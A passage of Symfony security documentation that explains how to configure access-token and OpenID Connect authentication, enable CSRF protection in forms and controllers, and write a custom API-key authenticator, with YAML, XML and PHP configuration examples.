This guide assumes you have setup security and have created a user object
in your application. Follow :doc:`the main security guide </security>` if
this is not yet the case.

1) Configure the Access Token Authenticator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To use the access token authenticator, you must configure a ``token_handler``.
The token handler receives the token from the request and returns the
correct user identifier. To get the user identifier, implementations may
need to load and validate the token (e.g. revocation, expiration time,
digital signature, etc.).

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler: App\Security\AccessTokenHandler

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token token-handler="App\Security\AccessTokenHandler"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AccessTokenHandler;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler(AccessTokenHandler::class)
            ;
        };

This handler must implement
:class:`Symfony\\Component\\Security\\Http\\AccessToken\\AccessTokenHandlerInterface`::

    // src/Security/AccessTokenHandler.php
    namespace App\Security;

    use App\Repository\AccessTokenRepository;
    use Symfony\Component\Security\Http\AccessToken\AccessTokenHandlerInterface;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;

    class AccessTokenHandler implements AccessTokenHandlerInterface
    {
        public function __construct(
            private AccessTokenRepository $repository
        ) {
        }

        public function getUserBadgeFrom(string $accessToken): UserBadge
        {
            // e.g. query the "access token" database to search for this token
            $accessToken = $this->repository->findOneByValue($accessToken);
            if (null === $accessToken || !$accessToken->isValid()) {
                throw new BadCredentialsException('Invalid credentials.');
            }

            // and return a UserBadge object containing the user identifier from the found token
            // (this is the same identifier used in Security configuration; it can be an email,
            // a UUUID, a username, a database ID, etc.)
            return new UserBadge($accessToken->getUserId());
        }
    }

The access token authenticator will use the returned user identifier to
load the user using the :ref:`user provider <security-user-providers>`.

.. caution::

    It is important to check the token if is valid. For instance, the
    example above verifies whether the token has not expired. With
    self-contained access tokens such as JWT, the handler is required to
    verify the digital signature and understand all claims, especially
    ``sub``, ``iat``, ``nbf`` and ``exp``.

2) Configure the Token Extractor (Optional)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The application is now ready to handle incoming tokens. A *token extractor*
retrieves the token from the request (e.g. a header or request body).

By default, the access token is read from the request header parameter
``Authorization`` with the scheme ``Bearer`` (e.g. ``Authorization: Bearer
the-token-value``).

Symfony provides other extractors as per the `RFC6750`_:

``header`` (default)
    The token is sent through the request header. Usually ``Authorization``
    with the ``Bearer`` scheme.
``query_string``
    The token is part of the request query string. Usually ``access_token``.
``request_body``
    The token is part of the request body during a POST request. Usually
    ``access_token``.

.. caution::

    Because of the security weaknesses associated with the URI method,
    including the high likelihood that the URL or the request body
    containing the access token will be logged, methods ``query_string``
    and ``request_body`` **SHOULD NOT** be used unless it is impossible to
    transport the access token in the request header field.

You can also create a custom extractor. The class must implement
:class:`Symfony\\Component\\Security\\Http\\AccessToken\\AccessTokenExtractorInterface`.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler: App\Security\AccessTokenHandler

                        # use a different built-in extractor
                        token_extractors: request_body

                        # or provide the service ID of a custom extractor
                        token_extractors: 'App\Security\CustomTokenExtractor'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token token-handler="App\Security\AccessTokenHandler">
                        <!-- use a different built-in extractor -->
                        <token-extractor>request_body</token-extractor>

                        <!-- or provide the service ID of a custom extractor -->
                        <token-extractor>App\Security\CustomTokenExtractor</token-extractor>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AccessTokenHandler;
        use App\Security\CustomTokenExtractor;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler(AccessTokenHandler::class)

                    // use a different built-in extractor
                    ->tokenExtractors('request_body')

                    # or provide the service ID of a custom extractor
                    ->tokenExtractors(CustomTokenExtractor::class)
            ;
        };

It is possible to set multiple extractors. In this case, **the order is
important**: the first in the list is called first.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler: App\Security\AccessTokenHandler
                        token_extractors:
                            - 'header'
                            - 'App\Security\CustomTokenExtractor'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token token-handler="App\Security\AccessTokenHandler">
                        <token-extractor>header</token-extractor>
                        <token-extractor>App\Security\CustomTokenExtractor</token-extractor>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AccessTokenHandler;
        use App\Security\CustomTokenExtractor;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler(AccessTokenHandler::class)
                    ->tokenExtractors([
                        'header',
                        CustomTokenExtractor::class,
                    ])
            ;
        };

3) Submit a Request
~~~~~~~~~~~~~~~~~~~

That's it! Your application can now authenticate incoming requests using an
API token.

Using the default header extractor, you can test the feature by submitting
a request like this:

.. code-block:: terminal

    $ curl -H 'Authorization: Bearer an-accepted-token-value' \
        https://localhost:8000/api/some-route

Customizing the Success Handler
-------------------------------

By default, the request continues (e.g. the controller for the route is
run). If you want to customize success handling, create your own success
handler by creating a class that implements
:class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationSuccessHandlerInterface`
and configure the service ID as the ``success_handler``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler: App\Security\AccessTokenHandler
                        success_handler: App\Security\Authentication\AuthenticationSuccessHandler

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token token-handler="App\Security\AccessTokenHandler"
                        success-handler="App\Security\Authentication\AuthenticationSuccessHandler"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\AccessTokenHandler;
        use App\Security\Authentication\AuthenticationSuccessHandler;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler(AccessTokenHandler::class)
                    ->successHandler(AuthenticationSuccessHandler::class)
            ;
        };

.. tip::

    If you want to customize the default failure handling, use the
    ``failure_handler`` option and create a class that implements
    :class:`Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationFailureHandlerInterface`.

Using OpenID Connect (OIDC)
---------------------------

`OpenID Connect (OIDC)`_ is the third generation of OpenID technology and it's a
RESTful HTTP API that uses JSON as its data format. OpenID Connect is an
authentication layer on top of the OAuth 2.0 authorization framework. It allows
to verify the identity of an end user based on the authentication performed by
an authorization server.

1) Configure the OidcUserInfoTokenHandler
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``OidcUserInfoTokenHandler`` requires the ``symfony/http-client`` package to
make the needed HTTP requests. If you haven't installed it yet, run this command:

.. code-block:: terminal

    $ composer require symfony/http-client

Symfony provides a generic ``OidcUserInfoTokenHandler`` to call your OIDC server
and retrieve the user info:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler:
                            oidc_user_info: https://www.example.com/realms/demo/protocol/openid-connect/userinfo

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token>
                        <token-handler oidc-user-info="https://www.example.com/realms/demo/protocol/openid-connect/userinfo"/>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security) {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler()
                        ->oidcUserInfo('https://www.example.com/realms/demo/protocol/openid-connect/userinfo')
            ;
        };

Following the `OpenID Connect Specification`_, the ``sub`` claim is used as user
identifier by default. To use another claim, specify it on the configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler:
                            oidc_user_info:
                                claim: email
                                base_uri: https://www.example.com/realms/demo/protocol/openid-connect/userinfo

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token>
                        <token-handler>
                            <oidc-user-info claim="email" base-uri="https://www.example.com/realms/demo/protocol/openid-connect/userinfo"/>
                        </token-handler>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security) {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler()
                        ->oidcUserInfo()
                            ->claim('email')
                            ->baseUri('https://www.example.com/realms/demo/protocol/openid-connect/userinfo')
            ;
        };

The ``oidc_user_info`` token handler automatically creates an HTTP client with
the specified ``base_uri``. If you prefer using your own client, you can
specify the service name via the ``client`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler:
                            oidc_user_info:
                                client: oidc.client

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token>
                        <token-handler>
                            <oidc-user-info client="oidc.client"/>
                        </token-handler>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security) {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler()
                        ->oidcUserInfo()
                            ->client('oidc.client')
            ;
        };

By default, the ``OidcUserInfoTokenHandler`` creates an ``OidcUser`` with the
claims. To create your own user object from the claims, you must
:doc:`create your own UserProvider </security/user_providers>`::

    // src/Security/Core/User/OidcUserProvider.php
    use Symfony\Component\Security\Core\User\AttributesBasedUserProviderInterface;

    class OidcUserProvider implements AttributesBasedUserProviderInterface
    {
        public function loadUserByIdentifier(string $identifier, array $attributes = []): UserInterface
        {
            // implement your own logic to load and return the user object
        }
    }

2) Configure the OidcTokenHandler
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``OidcTokenHandler`` requires ``web-token/jwt-signature``,
``web-token/jwt-checker`` and ``web-token/jwt-signature-algorithm-ecdsa``
packages. If you haven't installed them yet, run these commands:

.. code-block:: terminal

    $ composer require web-token/jwt-signature
    $ composer require web-token/jwt-checker
    $ composer require web-token/jwt-signature-algorithm-ecdsa

Symfony provides a generic ``OidcTokenHandler`` to decode your token, validate
it and retrieve the user info from it:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler:
                            oidc:
                                # Algorithm used to sign the JWS
                                algorithm: 'ES256'
                                # A JSON-encoded JWK
                                key: '{"kty":"...","k":"..."}'
                                # Audience (`aud` claim): required for validation purpose
                                audience: 'api-example'
                                # Issuers (`iss` claim): required for validation purpose
                                issuers: ['https://oidc.example.com']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token>
                        <token-handler>
                            <!-- Algorithm used to sign the JWS -->
                            <!-- A JSON-encoded JWK -->
                            <!-- Audience (`aud` claim): required for validation purpose -->
                            <oidc algorithm="ES256" key="{'kty':'...','k':'...'}" audience="api-example">
                                <!-- Issuers (`iss` claim): required for validation purpose -->
                                <issuer>https://oidc.example.com</issuer>
                            </oidc>
                        </token-handler>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security) {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler()
                        ->oidc()
                            // Algorithm used to sign the JWS
                            ->algorithm('ES256')
                            // A JSON-encoded JWK
                            ->key('{"kty":"...","k":"..."}')
                            // Audience (`aud` claim): required for validation purpose
                            ->audience('api-example')
                            // Issuers (`iss` claim): required for validation purpose
                            ->issuers(['https://oidc.example.com'])
            ;
        };

Following the `OpenID Connect Specification`_, the ``sub`` claim is used by
default as user identifier. To use another claim, specify it on the
configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    access_token:
                        token_handler:
                            oidc:
                                claim: email
                                algorithm: 'ES256'
                                key: '{"kty":"...","k":"..."}'
                                audience: 'api-example'
                                issuers: ['https://oidc.example.com']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <access-token>
                        <token-handler>
                            <oidc claim="email" algorithm="ES256" key="{'kty':'...','k':'...'}" audience="api-example">
                                <issuer>https://oidc.example.com</issuer>
                            </oidc>
                        </token-handler>
                    </access-token>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security) {
            $security->firewall('main')
                ->accessToken()
                    ->tokenHandler()
                        ->oidc()
                            ->claim('email')
                            ->algorithm('ES256')
                            ->key('{"kty":"...","k":"..."}')
                            ->audience('api-example')
                            ->issuers(['https://oidc.example.com'])
            ;
        };

By default, the ``OidcTokenHandler`` creates an ``OidcUser`` with the claims. To
create your own User from the claims, you must
:doc:`create your own UserProvider </security/user_providers>`::

    // src/Security/Core/User/OidcUserProvider.php
    use Symfony\Component\Security\Core\User\AttributesBasedUserProviderInterface;

    class OidcUserProvider implements AttributesBasedUserProviderInterface
    {
        public function loadUserByIdentifier(string $identifier, array $attributes = []): UserInterface
        {
            // implement your own logic to load and return the user object
        }
    }

Creating Users from Token
-------------------------

Some types of tokens (for instance OIDC) contain all information required
to create a user entity (e.g. username and roles). In this case, you don't
need a user provider to create a user from the database::

    // src/Security/AccessTokenHandler.php
    namespace App\Security;

    // ...
    class AccessTokenHandler implements AccessTokenHandlerInterface
    {
        // ...

        public function getUserBadgeFrom(string $accessToken): UserBadge
        {
            // get the data from the token
            $payload = ...;

            return new UserBadge(
                $payload->getUserId(),
                fn (string $userIdentifier) => new User($userIdentifier, $payload->getRoles())
            );
        }
    }

When using this strategy, you can omit the ``user_provider`` configuration
for :ref:`stateless firewalls <reference-security-stateless>`.

.. _`JSON Web Tokens (JWT)`: https://datatracker.ietf.org/doc/html/rfc7519
.. _`SAML2 (XML structures)`: https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html
.. _`RFC6750`: https://datatracker.ietf.org/doc/html/rfc6750
.. _`OpenID Connect Specification`: https://openid.net/specs/openid-connect-core-1_0.html
.. _`OpenID Connect (OIDC)`: https://en.wikipedia.org/wiki/OpenID#OpenID_Connect_(OIDC)
How to Implement CSRF Protection
================================

CSRF - or `Cross-site request forgery`_ - is a method by which a malicious
user attempts to make your legitimate users unknowingly submit data that
they don't intend to submit.

CSRF protection works by adding a hidden field to your form that contains a
value that only you and your user know. This ensures that the user - not some
other entity - is submitting the given data.

Before using the CSRF protection, install it in your project:

.. code-block:: terminal

    $ composer require symfony/security-csrf

Then, enable/disable the CSRF protection with the ``csrf_protection`` option
(see the :ref:`CSRF configuration reference <reference-framework-csrf-protection>`
for more information):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            csrf_protection: ~

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:csrf-protection enabled="true"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->csrfProtection()
                ->enabled(true)
            ;
        };

The tokens used for CSRF protection are meant to be different for every user and
they are stored in the session. That's why a session is started automatically as
soon as you render a form with CSRF protection.

.. _caching-pages-that-contain-csrf-protected-forms:

Moreover, this means that you cannot fully cache pages that include CSRF
protected forms. As an alternative, you can:

* Embed the form inside an uncached :doc:`ESI fragment </http_cache/esi>` and
  cache the rest of the page contents;
* Cache the entire page and load the form via an uncached AJAX request;
* Cache the entire page and use :ref:`hinclude.js <templates-hinclude>` to
  load the CSRF token with an uncached AJAX request and replace the form
  field value with it.

CSRF Protection in Symfony Forms
--------------------------------

Forms created with the Symfony Form component include CSRF tokens by default
and Symfony checks them automatically, so you don't have to do anything to be
protected against CSRF attacks.

.. _form-csrf-customization:

By default Symfony adds the CSRF token in a hidden field called ``_token``, but
this can be customized on a form-by-form basis::

    // src/Form/TaskType.php
    namespace App\Form;

    // ...
    use App\Entity\Task;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class TaskType extends AbstractType
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class'      => Task::class,
                // enable/disable CSRF protection for this form
                'csrf_protection' => true,
                // the name of the hidden HTML field that stores the token
                'csrf_field_name' => '_token',
                // an arbitrary string used to generate the value of the token
                // using a different string for each form improves its security
                'csrf_token_id'   => 'task_item',
            ]);
        }

        // ...
    }

You can also customize the rendering of the CSRF form field creating a custom
:doc:`form theme </form/form_themes>` and using ``csrf_token`` as the prefix of
the field (e.g. define ``{% block csrf_token_widget %} ... {% endblock %}`` to
customize the entire form field contents).

CSRF Protection in Login Forms
------------------------------

See :ref:`form_login-csrf` for a login form that is protected from CSRF
attacks. You can also configure the
:ref:`CSRF protection for the logout action <reference-security-logout-csrf>`.

.. _csrf-protection-in-html-forms:

Generating and Checking CSRF Tokens Manually
--------------------------------------------

Although Symfony Forms provide automatic CSRF protection by default, you may
need to generate and check CSRF tokens manually for example when using regular
HTML forms not managed by the Symfony Form component.

Consider a HTML form created to allow deleting items. First, use the
:ref:`csrf_token() Twig function <reference-twig-function-csrf-token>` to
generate a CSRF token in the template and store it as a hidden form field:

.. code-block:: html+twig

    <form action="{{ url('admin_post_delete', { id: post.id }) }}" method="post">
        {# the argument of csrf_token() is an arbitrary string used to generate the token #}
        <input type="hidden" name="token" value="{{ csrf_token('delete-item') }}">

        <button type="submit">Delete item</button>
    </form>

Then, get the value of the CSRF token in the controller action and use the
:method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::isCsrfTokenValid`
method to check its validity::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    public function delete(Request $request): Response
    {
        $submittedToken = $request->getPayload()->get('token');

        // 'delete-item' is the same value used in the template to generate the token
        if ($this->isCsrfTokenValid('delete-item', $submittedToken)) {
            // ... do something, like deleting an object
        }
    }

.. _csrf-controller-attributes:

Alternatively you can use the
:class:`Symfony\\Component\\Security\\Http\\Attribute\\IsCsrfTokenValid`
attribute on the controller action::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Security\Http\Attribute\IsCsrfTokenValid;
    // ...

    #[IsCsrfTokenValid('delete-item', tokenKey: 'token')]
    public function delete(Request $request): Response
    {
        // ... do something, like deleting an object
    }

.. versionadded:: 7.1

    The :class:`Symfony\\Component\\Security\\Http\\Attribute\\IsCsrfTokenValid`
    attribute was introduced in Symfony 7.1.

CSRF Tokens and Compression Side-Channel Attacks
------------------------------------------------

`BREACH`_ and `CRIME`_ are security exploits against HTTPS when using HTTP
compression. Attackers can leverage information leaked by compression to recover
targeted parts of the plaintext. To mitigate these attacks, and prevent an
attacker from guessing the CSRF tokens, a random mask is prepended to the token
and used to scramble it.

.. _`Cross-site request forgery`: https://en.wikipedia.org/wiki/Cross-site_request_forgery
.. _`BREACH`: https://en.wikipedia.org/wiki/BREACH
.. _`CRIME`: https://en.wikipedia.org/wiki/CRIME
How to Write a Custom Authenticator
===================================

Symfony comes with :ref:`many authenticators <security-authenticators>` and
third party bundles also implement more complex cases like JWT and oAuth
2.0. However, sometimes you need to implement a custom authentication
mechanism that doesn't exist yet or you need to customize one. In such
cases, you must create and use your own authenticator.

Authenticators should implement the
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\AuthenticatorInterface`.
You can also extend
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\AbstractAuthenticator`,
which has a default implementation for the ``createToken()``
method that fits most use-cases::

    // src/Security/ApiKeyAuthenticator.php
    namespace App\Security;

    use Symfony\Component\HttpFoundation\JsonResponse;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Core\Exception\AuthenticationException;
    use Symfony\Component\Security\Core\Exception\CustomUserMessageAuthenticationException;
    use Symfony\Component\Security\Http\Authenticator\AbstractAuthenticator;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
    use Symfony\Component\Security\Http\Authenticator\Passport\Passport;
    use Symfony\Component\Security\Http\Authenticator\Passport\SelfValidatingPassport;

    class ApiKeyAuthenticator extends AbstractAuthenticator
    {
        /**
         * Called on every request to decide if this authenticator should be
         * used for the request. Returning `false` will cause this authenticator
         * to be skipped.
         */
        public function supports(Request $request): ?bool
        {
            return $request->headers->has('X-AUTH-TOKEN');
        }

        public function authenticate(Request $request): Passport
        {
            $apiToken = $request->headers->get('X-AUTH-TOKEN');
            if (null === $apiToken) {
                // The token header was empty, authentication fails with HTTP Status
                // Code 401 "Unauthorized"
                throw new CustomUserMessageAuthenticationException('No API token provided');
            }

            // implement your own logic to get the user identifier from `$apiToken`
            // e.g. by looking up a user in the database using its API key
            $userIdentifier = /** ... */;

            return new SelfValidatingPassport(new UserBadge($userIdentifier));
        }

        public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
        {
            // on success, let the request continue
            return null;
        }

        public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
        {
            $data = [
                // you may want to customize or obfuscate the message first
                'message' => strtr($exception->getMessageKey(), $exception->getMessageData())

                // or to translate this message
                // $this->translator->trans($exception->getMessageKey(), $exception->getMessageData())
            ];

            return new JsonResponse($data, Response::HTTP_UNAUTHORIZED);
        }
    }

.. tip::

    If your custom authenticator is a login form, you can extend from the
    :class:`Symfony\\Component\\Security\\Http\\Authenticator\\AbstractLoginFormAuthenticator`
    class instead to make your job easier.

The authenticator can be enabled using the ``custom_authenticators`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:

            # ...
            firewalls:
                main:
                    custom_authenticators:
                        - App\Security\ApiKeyAuthenticator

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <custom-authenticator>App\Security\ApiKeyAuthenticator</custom-authenticator>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\ApiKeyAuthenticator;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->enableAuthenticatorManager(true);
            // ....

            $security->firewall('main')
                ->customAuthenticators([ApiKeyAuthenticator::class])
            ;
        };

.. tip::

    You may want your authenticator to implement
    ``AuthenticationEntryPointInterface``. This defines the response sent
    to users to start authentication (e.g. when they visit a protected
    page). Read more about it in :doc:`/security/entry_point`.

The ``authenticate()`` method is the most important method of the
authenticator. Its job is to extract credentials (e.g. username &
password, or API tokens) from the ``Request`` object and transform these
into a security
:class:`Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Passport`
(security passports are explained later in this article).

After the authentication process finished, the user is either authenticated
or there was something wrong (e.g. incorrect password). The authenticator
can define what happens in these cases:

``onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response``
    If the user is authenticated, this method is called with the
    authenticated ``$token``. This method can return a response (e.g.
    redirect the user to the homepage).

    If ``null`` is returned, the request continues like normal (i.e. the
    controller matching the login route is called). This is useful for API
    routes where each route is protected by an API key header.

``onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response``
    If an ``AuthenticationException`` is thrown during authentication, the
    process fails and this method is called. This method can return a
    response (e.g. to return a 401 Unauthorized response in API routes).

    If ``null`` is returned, the request continues like normal. This is
    useful for e.g. login forms, where the login controller is run again
    with the login errors.

    If you're using :ref:`login throttling <security-login-throttling>`,
    you can check if ``$exception`` is an instance of
    :class:`Symfony\\Component\\Security\\Core\\Exception\\TooManyLoginAttemptsAuthenticationException`
    (e.g. to display an appropriate message).

    **Caution**: Never use ``$exception->getMessage()`` for ``AuthenticationException``
    instances. This message might contain sensitive information that you
    don't want to be publicly exposed. Instead, use ``$exception->getMessageKey()``
    and ``$exception->getMessageData()`` like shown in the full example
    above. Use :class:`Symfony\\Component\\Security\\Core\\Exception\\CustomUserMessageAuthenticationException`
    if you want to set custom error messages.

.. tip::

    If your login method is interactive, which means that the user actively
    logged into your application, you may want your authenticator to implement the
    :class:`Symfony\\Component\\Security\\Http\\Authenticator\\InteractiveAuthenticatorInterface`
    so that it dispatches an
    :class:`Symfony\\Component\\Security\\Http\\Event\\InteractiveLoginEvent`

.. _security-passport:

Security Passports
------------------

A passport is an object that contains the user that will be authenticated as
well as other pieces of information, like whether a password should be checked
